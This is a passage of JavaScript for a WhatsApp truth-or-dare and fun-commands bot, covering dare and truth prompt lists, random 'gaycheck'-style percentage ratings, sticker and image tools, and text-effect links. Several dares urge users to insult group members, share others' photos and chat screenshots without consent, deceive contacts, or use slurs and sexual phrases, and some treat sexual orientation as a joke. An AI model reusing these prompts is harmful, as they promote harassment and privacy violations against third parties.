"Eat 2 tablespoons of rice without any side dishes, if it feels heavy, you can drink.",
"Name the person who makes you speechless",
"Call your crush/girlfriend now and send a screenshot here",
"Send emotes only every time you type in a chat group/private chat for 1 day.",
"Say 'Welcome to Who Wants To Be a Millionaire!' to all the groups you have",
"Call your ex and say you miss him",
"sing the chorus of the last song you played",
"Record a voice for your ex/girlfriend, say 'Hi (name), want to call, wait a minute. I really miss you",
"Hit the table (at home) until you get scolded for being noisy",
"Tell a stranger I was just told that I was your first sibling, we separated, then I had plastic surgery and you love him/her",
"Mention your ex's name",
"make 1 rhyme for group members!",
"Send your WhatsApp conversation list",
"Chat with strangers in ghetto language then capture screen here",
"Tell your own version of embarrassing things",
"Tag someone you hate",
"Pretend to be affected, for example: affected by dogs, affected by grasshoppers, affected by refrigerators, etc.",
"Change the name to *I AM DONKEY* for 24 hours",
"Shout *ma chuda ma chuda ma chuda* in front of your house",
"Take a photo/portrait of your girlfriend or crush and send it here",
"Tell me the type of boyfriend you like!",
"Say *I have a crush on you, will you be my boyfriend?* to the opposite sex, the last time you talked to him (send it on WA/Telegram), wait until he replies, if so, give it here",
"Record your voice reading *titar ke age do titar, titar ke piche do titar*",
"Chat jokes with your ex and say *I love you, please come back.* without mentioning that it's a challenge!",
"Chat with WhatsApp contacts in order according to your phone's battery percentage, then say I'm lucky to have you!",
"Change you name to *I am a child of God* for 5 hours",
"Type in your native language for 24 hours",
"Use Ariana grande photo for 3 days",
"Send a song quote then tag members who match the quote",
"Send a voice message saying Can I call you darling?",
"Screenshot of the last conversation on your WhatsApp",
"Say *YOU ARE VERY BEAUTIFUL, DON'T LIE* to your same sex friends!",
"Call one of the group members and say something rude to them",
"Act like a chicken in front of your parents",
"Take a book at random and read a page aloud and record the voice and post it here",
"Open the front door of your house and bark like a wolf for 10 seconds",
"Take an embarrassing selfie and make it your profile photo",
"Let the group choose a word and a song that is known. You have to sing the song and send it as a voice message here",
"Walk supported with your elbows and knees as long as you can",
"sing the national anthem in voice messages",
"Do 30 seconds of breakdancing in the living room",
"Tell me a sad story that you know",
"Create a short twerk dance video and upload it as a status for 5 minutes",
"Eat a piece of raw garlic",
"Show the last five people you messaged and fill in their messages",
"Make your full name as status for 5 hours",
"Create a short, unfiltered dance video with just music and upload it as a status for 5 hours",
"Call your best friend, bullshit",
"Make a photo of yourself without a filter as a status for 10 minutes",
"Say 'I love Oli London' in a voice message 😄",
"Send your ex a message and tell him you still like him",
"Call your crush/girlfriend/friend now and screenshot here",
"Be rude to one of the group members in a private conversation and say you're ugly, a burden",
"Say YOU'RE BEAUTIFUL/HANDSOME to one of the people at the top of your pinlist or the first person in your conversation list",
"Send a voice message and say Can I call you Baby. If you are a man, say a woman's name. If you are a woman, say a man's name",
"Write I love you (the name of a random group member who is online) in a private conversation (if you are a man, write a woman's name; if you are a woman, write a man's name), take a screenshot and post it here",
"Use a Nollywood actor's photo as your profile photo for 3 days",
"Make your crush's photo a status with the caption 'This is my crush'",
"Change the name to *I AM GAY* for 5 hours",
"Chat with one of your contacts on WhatsApp and say I will be your girlfriend for 5 hours",
"Send a voice message and say I have a crush on you, will you be my girlfriend? to a random person from the group (if you're a girl, choose a boy's name; if you're a boy, choose a girl's name)",
"Spank your ass hard and send a slapping sound via voice message 😂",
"Name your girlfriend's type and send her photo here with the caption 'The ugliest woman/man in the world'",
"Shout 'bravooooooooo' and send it via voice message here",
"Take a photo of your face and post it here",
"Send a photo of yourself with the caption I'm a lesbian",
"Shout using harsh words and send via voice message",
"Scream you bastard in front of your mother or father",
"Change the name to *I'm stupid for 24 hours*",
"Hit yourself steadily and send the sound of the hit via voice message 😂",
"Say i love to fuck via voice message",
"Send a photo of your girlfriend or crush here",
"Create any TikTok dance challenge video and upload as status, you can delete it after 5 hours",
"Unfriending your best friend for 5 hours without telling him is a challenge",
"Tell one of your friends that you love him and want to marry him, without telling him that it is a challenge",
"Say I love my daddy via voice message",
"Write I feel horny and upload it as a status, you can only delete it after 5 hours",
"Write I'm a lesbian and upload it as a status, you can only delete it after 5 hours",
"Kiss your mom or dad and say I love you 😌",
"Make your father's name as status for 5 hours",
"Send harsh words in any group, except this group, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              Dare.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
        break
       case 'truth':
              const truth =[
"Have you ever liked someone? How long?",
    "If you could or if you wanted, which chat group or outside group would you like to be friends with? (can be different/same type)",
    "What is your biggest fear?",
    "Have you ever liked someone and felt that that person liked you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever taken money from your father or mother? The reason?",
    "What makes you happy when you're sad?",
    "Have you ever had feelings of one-way love? If yes, who? How did you feel, sɪʀ?",
    "Have you ever been someone's mistress?",
    "The most feared thing?",
    "Who is the most influential person in your life?",
    "What achievements have you achieved this year?",
    "Who is the person who can make you cool?",
    "Who is the person who has made you the most happy?",
    "Who is closest to your ideal partner type here?",
    "Who do you like to play with?",
    "Have you ever rejected someone? reasons why?",
    "Name an incident that hurt your feelings that you still remember",
    "What achievements have you achieved this year?",
    "Your worst habit at school?",
    "What song do you sing most often in the bathroom?",
    "Have you ever had a near death experience?",
    "When was the last time you were so angry? Why?",
    "Who was the last person to call you?",
    "Do you have any hidden talents? What are they?",
    "What word do you hate the most?",
    "What was the last YouTube video you watched?",
    "What was the last thing you googled?",
    "In this group, with whom would you like to exchange your life for a week?",
    "What is the scariest thing that has ever happened to you?",
    "Have you ever farted and blamed it on someone else?",
    "When was the last time you made someone else cry?",
    "Have you ever lost track of a friend?",
    "Have you ever seen a corpse?",
    "Which member of your family bothers you the most and why?",
    "If you had to delete one app from your phone, which app would you delete?",
    "What apps do you waste the most time on?",
    "Have you ever pretended to be sick to get home from school?",
    "What's the most embarrassing thing in your room?",
    "If you were stranded on a desert island, what five things would you take with you?",
    "Have you ever laughed so hard your pee was wet?",
    "Do you smell your own farts?",
    "Have you ever peed in bed while sleeping?",
    "What's the biggest mistake you've ever made?",
    "Have you ever cheated on an exam?",
    "What's the worst thing you've ever done?",
    "When was the last time you cried?",
    "Among your parents, who do you love the most?",
    "Do you sometimes put your fingers in your nostrils?",
    "Who was your crush when you were at school?",
    "Speaking honestly, do you like a boy in this group?",
    "Have you ever liked someone? How long?",
    "Do you have a boyfriend? What is your biggest fear?",
    "Have you ever liked someone and felt that that person liked you too?",
    "What is the name of your friend's ex-girlfriend that you secretly liked?",
    "Have you ever taken money from your mother or father? What is the reason?",
    "What makes you happy when you're sad?",
    "Do you like anyone in this group? If yes, who?",
    "Have you ever been cheated on by someone?",
    "Who is the most important person in your life?",
    "What achievements have you achieved this year?",
    "Who is the person who can make you happy when you are sad?",
    "Who is the person who has ever made you feel uncomfortable?",
    "Have you ever lied to your parents?",
    "Do you still like your ex-boyfriend?",
    "Who do you want to play with?",
    "Have you ever stolen something big? What was the reason?",
    "Name an incident that has hurt you and that you still remember?",
    "What achievements have you achieved this year?",
    "What was your worst habit at school?",
    "Do you love the creator of this bot, Dani 😄",
    "Have you ever thought about taking revenge on the teacher?",
    "Do you like the current prime minister of your country?",
    "Are you vegetarian or non-vegetarian?",
    "If you could become invisible, what would you do first?",
    "What secret do you keep from your parents?",
    "Who is your secret crush?",
    "Who was the last person you peeked at on social media?",
    "If a genie gave you three wishes, what would you ask for?",
    "What is your biggest regret?",
    "What kind of animal do you think is most similar to you?",
    "How many selfies do you take in a day?",
    "What was your favorite show from childhood?",
    "If you could be a fictional character in one day, who would you choose?",
    "Who do you text the most with?",
    "What's the biggest lie you've ever told your parents?",
    "Which celebrity is your idol?",
    "The strangest dream you have ever had?",
    "Do you play PUBG? If yes, please provide your ID number."
]
              const Nanotruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              Dare.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ Nanotruth }, {quoted:m})
              break
case 'checkme': {
  const args = text.split(" ");
  const bet = `${sender}`;

  const sifat = ['🤔 Fine','😡 Unfriendly','👎 Chapri','💔 Nibba/nibbi','😤 Annoying','💀 Dilapidated','😡 Angry person','😊 Polite','🙄 Burden','💯 Great','🤮 Cringe','🤥 Liar'];
  const hoby = ['🍳 Cooking','💃 Dancing','🎮 Playing','🎮 Gaming','🎨 Painting','🤝 Helping Others','🍿 Watching anime','📚 Reading','🚴‍♂️ Riding Bike','🎤 Singing','💬 Chatting','😂 Sharing Memes','✍️ Drawing','💸 Eating Parents Money','🎲 Playing Truth or Dare','🤫 Staying Alone'];
  const bukcin = [...Array(100).keys()].map(i => String(i + 1));
  const arp = bukcin.slice();
  const cakep = ['✅ Yes','❌ No','😖 Very Ugly','😍 Very Handsome'];
  const wetak = ['💖 Caring','💎 Generous','😡 Angry person','😔 Sorry','🤲 Submissive','😊 Fine','🙇‍♂️ Im sorry','🧡 Kind Hearted','😌 Patient','🥰 UwU','🔥 Top','🤗 Helpful'];
  const baikk = bukcin.slice();
  const bhuruk = bukcin.slice();
  const cerdhas = bukcin.slice();
  const berhani = bukcin.slice();
  const mengheikan = bukcin.slice();

  const sipat = sifat[Math.floor(Math.random() * sifat.length)];
  const biho = hoby[Math.floor(Math.random() * hoby.length)];
  const bhucin = bukcin[Math.floor(Math.random() * bukcin.length)];
  const senga = arp[Math.floor(Math.random() * arp.length)];
  const chakep = cakep[Math.floor(Math.random() * cakep.length)];
  const watak = wetak[Math.floor(Math.random() * wetak.length)];
  const baik = baikk[Math.floor(Math.random() * baikk.length)];
  const burug = bhuruk[Math.floor(Math.random() * bhuruk.length)];
  const cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)];
  const berani = berhani[Math.floor(Math.random() * berhani.length)];
  const takut = mengheikan[Math.floor(Math.random() * mengheikan.length)];

  const profile = `
*≡══《 Check @${bet.split('@')[0]} 》══≡*
*🤖 Bot Name: DARE-V3*
*🧑‍🤝‍🧑 𝗡𝗮𝗺𝗲:* ${m.pushName}
*⚡ 𝗖𝗵𝗮𝗿𝗮𝗰𝘁𝗲𝗿𝗶𝘀𝘁𝗶𝗰:* ${sipat}
*🎨 𝗛𝗼𝗯𝗯𝘆:* ${biho}
*💖 𝗦𝗶𝗺𝗽𝗹𝗲𝗻𝗲𝘀𝘀 (Simp):* ${bhucin}%
*💥 𝗚𝗿𝗲𝗮𝘁𝗻𝗲𝘀𝘀:* ${senga}%
*🌟 𝗛𝗮𝗻𝗱𝘀𝗼𝗺𝗲:* ${chakep}
*💬 𝗖𝗵𝗮𝗿𝗮𝗰𝘁𝗲𝗿:* ${watak}
*🌱 𝗚𝗼𝗼𝗱 𝗠𝗼𝗿𝗮𝗹𝘀:* ${baik}%
*😈 𝗕𝗮𝗱 𝗠𝗼𝗿𝗮𝗹𝘀:* ${burug}%
*🧠 𝗜𝗻𝘁𝗲𝗹𝗹𝗶𝗴𝗲𝗻𝗰𝗲:* ${cerdas}%
*🔥 𝗖𝗼𝘂𝗿𝗮𝗴𝗲:* ${berani}%
*😱 𝗔𝗳𝗿𝗮𝗶𝗱:* ${takut}%

*≡═《𝗖𝗵𝗲𝗰𝗸 𝗽𝗿𝗼𝗽𝗲𝗿𝘁𝗶𝗲𝘀》═≡*
`;

const imageUrl = 'https://files.catbox.moe/128g9s.jpg';
await Dare.sendMessage(m.chat, {
  image: { url: imageUrl }, // Directly use the URL for the image
  caption: profile, // Custom message with check result and mentioned user
  mentions: [bet] // Mentions the mentioned user
});
}
break;
case 'tagme': {
  Dare.sendMessage(m.chat, { text: `@${m.sender.split('@')[0]}`, mentions: [m.sender] }, { quoted: m })
}
break
case 'dice': {
  let ddsa = [{ url: 'https://telegra.ph/file/9f60e4cdbeb79fc6aff7a.png', no: 1 },{ url: 'https://telegra.ph/file/797f86e444755282374ef.png', no: 2 },{ url: 'https://telegra.ph/file/970d2a7656ada7c579b69.png', no: 3 },{ url: 'https://telegra.ph/file/0470d295e00ebe789fb4d.png', no: 4 },{ url: 'https://telegra.ph/file/a9d7332e7ba1d1d26a2be.png', no: 5 },{ url: 'https://telegra.ph/file/99dcd999991a79f9ba0c0.png', no: 6 }]
  let media = pickRandom(ddsa)
  await Dare.sendImageAsSticker(m.chat, media.url, m, { packname: global.packname, author: global.author, isAvatar: 1 })
}
break
case 'img': case 'image': case 'picture': {
  if (!text) return replydare(`*• Example:* ${prefix + command} luffy one piece,10`);
reply(mess.wait)
  try {
      // Split the input text to get the search term and the amount
      let [searchTerm, amount] = text.split(',').map(item => item.trim());
      // Default to 1 if no amount is provided
      amount = amount ? parseInt(amount) : 1;

      // Limit the maximum number of images to 30
      if (amount > 30) {
          amount = 30;
          replydare('⚠️ *Maximum limit is 30 images.* Sending 30 images.');
      } else if (amount <= 0 || isNaN(amount)) {
          return replydare('❌ *Invalid number of images.* Please enter a number between 1 and 30.');
      }

      // List of new API URLs for fetching images
      const apiUrls = [
          'https://aemt.uk.to/googleimage?query=',
          'https://meitang.xyz/googleimage?query=',
          'https://btch.us.kg/googleimage?query=',
          'https://api.tioo.eu.org/googleimage?query=',
          'https://api.tioprm.eu.org/googleimage?query='
      ];

      // Select a random API URL
      const randomApiUrl = apiUrls[Math.floor(Math.random() * apiUrls.length)];

      // Fetch the image URLs from the selected API
      let response = await fetch(randomApiUrl + encodeURIComponent(searchTerm));

      // Check if the response is okay
      if (!response.ok) {
          return replydare('❌ *Failed to fetch the images.* Please try again.');
      }

      // Parse the response JSON
      let data = await response.json();
      if (!data.result || data.result.length === 0) {
          return replydare('❌ *No images found for the given query.*');
      }

      // Select a random set of images from the fetched URLs
      let imageUrls = [];
      for (let i = 0; i < amount; i++) {
          let randomImageUrl = data.result[Math.floor(Math.random() * data.result.length)];
          imageUrls.push(randomImageUrl);
      }

      // Send each selected image with a caption
      for (let imageUrl of imageUrls) {
          try {
              let imgResponse = await fetch(imageUrl);
              if (imgResponse.status === 403) {
                  console.warn(`⚠️ *403 Forbidden* for URL: ${imageUrl}. Skipping.`);
                  continue; // Skip to the next image URL
              }

              await Dare.sendMessage(m.chat, {
                  image: { url: imageUrl },
                  caption: `🖼️ *Image Result* 🎨\n\n✨ _Here is the result of: ${searchTerm}_ 🔍`
              }, { quoted: m });
          } catch (error) {
              console.error(`❌ Error sending image ${imageUrl}:`, error);
              continue; // Continue to the next image in case of an error
          }
      }

  } catch (e) {
      console.error('⚠️ Error fetching the images:', e);
      return replydare("❗ *Error fetching the images.* Please try again.");
  }
}
break;
case 'toimg': {
	reply(mess.wait)
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replydare(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await Dare.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            Dare.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return replydare(`Please reply to non animated sticker`)
    }
    break
case 'swm': case 'steal': case 'stickerwm': case 'take': case 'wm': {
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : `𝘽.𝙈.𝘽 🙂`
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await Dare.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await Dare.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
	break

case 'delsampah':{
	let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return reply('Unable to scan directory: ' + err);
	 } 
	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") || item.endsWith("opus") || item.endsWith("jpeg"))
	console.log(filteredArray.length); 
	let teks =`Detected ${filteredArray.length} file Kenangan <3\n\n`
	if(filteredArray.length == 0) return reply(`${teks}`)
	filteredArray.map(function(e, i){
	teks += (i+1)+`. ${e}\n`
	})
	 
	reply(`${teks}`)
	
//	await sleep(2000)
	reply("Deleting Memories files...")
	await filteredArray.forEach(function (file) {
	fs.unlinkSync(file)
	});
	//await sleep(2000)
	reply("Successfully erased all Memories <3")
	 
	});
	  }
	break 

case 'qc': {
    if (!q) return replydare('Enter Text');
    const ppnyauser = await Dare.profilePictureUrl(m.sender, 'image').catch(_ => 'https://files.catbox.moe/7rt6v2.jpg');
    const json = {
        "type": "quote",
        "format": "png",
        "backgroundColor": "#FFFFFF",
        "width": 512,
        "height": 768,
        "scale": 2,
        "messages": [
            {
                "entities": [],
                "avatar": true,
                "from": {
                    "id": 1,
                    "name": pushname,
                    "photo": {
                        "url": ppnyauser
                    }
                },
                "text": q,
                "replyMessage": {}
            }
        ]
    };

    const res = await axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
    });
    const buffer = Buffer.from(res.data.result.image, 'base64');
    const rest = { 
        status: "200", 
        creator: "AdrianTzy",
        result: buffer
    };

    Dare.sendImageAsSticker(m.chat, rest.result, m, {
        packname: `${global.packname}`,
        author: `${global.author}`
    });
}
break;
case 's':
case 'stiker':
case 'sticker': {
  if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Dare.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await Dare.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'quotes':
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return replydare(textquotes)
break
case 'handsomecheck':
				if (!text) return replydare(`Tag Someone, Example : ${prefix + command} @𝐁𝐌𝐁`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
Dare.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replydare(`Tag Someone, Example : ${prefix + command} @𝐁𝐌𝐁`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
Dare.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replydare(`Tag Someone, Example : ${prefix + command} @𝐁𝐌𝐁`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					Dare.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
 case 'prettycheck':
case 'lovelycheck':
  case 'uglycheck':
if (!m.isGroup) return reply(mess.only.group)
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
Dare.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
Dare.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
Dare.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'obfus': case 'enc': case 'obfuscate':{
if (!q) return replydare(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
replydare(`Success
${meg.result}`)
}
break
case 'style': case 'fancy': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replydare('Enter Query text!')
let anu = await styletext(text)
let teks = `Style Text From ${text}\n\n`
for (let i of anu) {
teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
}
replydare(teks)
	    }
	    break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return replydare(`Example : ${prefix+command} Dare`) 
reply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
Dare.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break

        case "shadow":
        case "write":
        case "romantic":
        case "burnpaper":
        case "smoke":
        case "narutobanner":
        case "love":
        case "undergrass":
        case "doublelove":
        case "coffecup":
        case "underwaterocean":
        case "smokyneon":
        case "starstext":
        case "rainboweffect":
        case "balloontext":
        case "metalliceffect":
        case "embroiderytext":
        case "flamingtext":
        case "stonetext":
        case "writeart":
        case "summertext":
        case "wolfmetaltext":
        case "nature3dtext":
        case "rosestext":
        case "naturetypography":
        case "quotesunder":
        case "shinetext":
          {
            if (!q) {
              return replydare(`🔮Example :   ${prefix+command} Dare`);
            }
            let link;
            if (/stonetext/.test(command)) {
              link = "https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html";
            }
            if (/writeart/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html";
            }
            if (/summertext/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html";
            }
            if (/wolfmetaltext/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html";
            }
            if (/nature3dtext/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html";
            }
            if (/rosestext/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html";
            }
            if (/naturetypography/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html";
            }
            if (/quotesunder/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html";
            }
            if (/shinetext/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html";
            }
            if (/shadow/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html";
            }
            if (/write/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html";
            }
            if (/romantic/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html";
            }
            if (/burnpaper/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html";
            }
            if (/smoke/.test(command)) {
              link = "https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html";
            }
            if (/narutobanner/.test(command)) {
              link = "https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html";
            }
            if (/love/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html";
            }
            if (/undergrass/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html";
            }
            if (/doublelove/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/love-text-effect-372.html";
            }
            if (/coffecup/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html";
            }
            if (/underwaterocean/.test(command)) {
